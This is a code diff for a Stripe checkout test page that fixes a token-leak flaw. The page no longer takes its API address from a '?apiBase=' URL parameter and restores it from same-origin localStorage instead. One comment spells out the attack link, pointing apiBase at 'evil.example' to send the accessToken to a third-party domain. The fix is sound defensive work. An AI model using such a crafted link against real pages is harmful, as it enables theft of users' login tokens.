@@ -55,6 +55,11 @@
 const $ = (id) => document.getElementById(id);
 const out = (v) => { $('out').textContent = typeof v === 'string' ? v : JSON.stringify(v, null, 2); };
 
+// 接口地址 / envId 的本地持久化键。都只存在同源 localStorage：
+// 外部链接无法写入这些键，所以回跳时恢复地址不会被第三方控制。
+const API_BASE_STORAGE_KEY = 'payStripeApiBase';
+const ENV_ID_STORAGE_KEY = 'payStripeEnvId';
+
 function headers() {
   const h = { 'content-type': 'application/json' };
   const t = $('token').value.trim();
@@ -105,20 +110,16 @@ $('pay').addEventListener('click', async () => {
   const btn = $('pay');
   btn.disabled = true;
   try {
-    // 回跳后 initFromQuery 靠 apiBase / envId 恢复云函数地址并静默登录，自动查单
-    // 靠 session_id：三者都必须留在 success_url 里。只拼 session_id 会丢掉前两个
-    // 参数 —— 回跳后 base 为空、自动登录不执行、token 为空，自动查单必然失败。
+    // 🚨 回跳地址只带 session_id，不再把接口地址 / envId 写进 URL：
+    //    原实现回跳时从 ?apiBase= 恢复地址并自动静默登录，别人发一条
+    //    ?apiBase=https://evil.example&envId=xxx 的链接，就能让页面把 accessToken
+    //    发到第三方域名。地址改由 localStorage（同源、外部不可写）恢复。
     // ⚠️ {CHECKOUT_SESSION_ID} 是 Stripe 字面量占位符，必须原样拼进 URL（不能 encode），
     //    回跳时会被替换成 cs_xxx；它只在 success_url 中被替换，cancel_url 里照抄会
     //    拿到字面量并触发一次必然失败的查单，故 cancel_url 不拼 session_id。
-    const q = new URLSearchParams(location.search);
-    const apiBase = (q.get('apiBase') || $('base').value).trim();
-    const envId = (q.get('envId') || '').trim();
-    const returnParams = [];
-    if (apiBase) returnParams.push('apiBase=' + encodeURIComponent(apiBase));
-    if (envId) returnParams.push('envId=' + encodeURIComponent(envId));
-    const returnBase = location.origin + location.pathname
-      + (returnParams.length ? '?' + returnParams.join('&') : '');
+    const apiBase = $('base').value.trim().replace(/\/$/, '');
+    if (apiBase) localStorage.setItem(API_BASE_STORAGE_KEY, apiBase);
+    const returnBase = location.origin + location.pathname;
 
     // input 的 step/min 只有放进 <form> 并由 checkValidity() 触发才生效，
     // 这里手动校验，避免 9.9 / 0 / -5 被原样发给服务端再吃一个 400
@@ -135,7 +136,7 @@ $('pay').addEventListener('click', async () => {
       amount: Number(rawAmount),
       currency: $('currency').value.trim().toLowerCase(),
       productName: $('product').value.trim() || '示例商品',
-      success_url: returnBase + (returnParams.length ? '&' : '?') + 'session_id={CHECKOUT_SESSION_ID}',
+      success_url: returnBase + '?session_id={CHECKOUT_SESSION_ID}',
       cancel_url: returnBase,
       // 🚨 必填：回调按它反查订单。不传的话下单可以被 Stripe 接受，但
       //    webhook 会因「缺业务主键」被拒，订单永远停在未支付态
@@ -154,9 +155,9 @@ $('pay').addEventListener('click', async () => {
 });
 
 // ---------- URL 参数预填 + CloudBase 静默登录 ----------
-// 用法：?apiBase=https://<envId>.service.tcloudbase.com/pay-stripe&envId=<环境ID>
-//   只带 apiBase   → 仅预填地址，token 手动填
-//   同时带 envId   → 加载 CloudBase SDK，尝试静默登录并自动填入 accessToken
+// 用法：?envId=<环境ID>
+//   envId    → 加载 CloudBase SDK，尝试静默登录并自动填入 accessToken
+//   接口地址 → 从同源 localStorage 恢复（首次手动填，下单时记住；不接受 URL 参数）
 //   SDK 脚本是动态加载的：不带 envId 时不会发出额外请求，页面仍可离线使用
 const SDK_URL = 'https://static.cloudbase.net/cloudbase-js-sdk/latest/cloudbase.full.js';
 
@@ -180,14 +181,20 @@ function loadSdk() {
 
 async function initFromQuery() {
   const q = new URLSearchParams(location.search);
-  const apiBase = (q.get('apiBase') || '').trim();
-  if (apiBase) $('base').value = apiBase;
 
-  const envId = (q.get('envId') || '').trim();
+  // 🚨 接口地址只从 localStorage 恢复，**不接受 URL 参数**：
+  //    ?apiBase= 完全由链接构造者控制，而页面随后会带着登录态请求它。
+  const storedBase = (localStorage.getItem(API_BASE_STORAGE_KEY) || '').trim();
+  if (storedBase) $('base').value = storedBase;
+
+  // envId 只决定「去哪拿 token」，不决定「把 token 发给谁」；仍做形态校验
+  const rawEnvId = (q.get('envId') || localStorage.getItem(ENV_ID_STORAGE_KEY) || '').trim();
+  const envId = /^[a-z0-9][a-z0-9-]{2,}$/i.test(rawEnvId) ? rawEnvId : '';
   if (!envId) {
     setHint('未带 envId：跳过自动登录，请手动填 token（地址后加 &envId=<环境ID> 可自动登录）');
     return;
   }
+  localStorage.setItem(ENV_ID_STORAGE_KEY, envId);
 
   setHint('正在加载 CloudBase SDK...');
   await loadSdk();
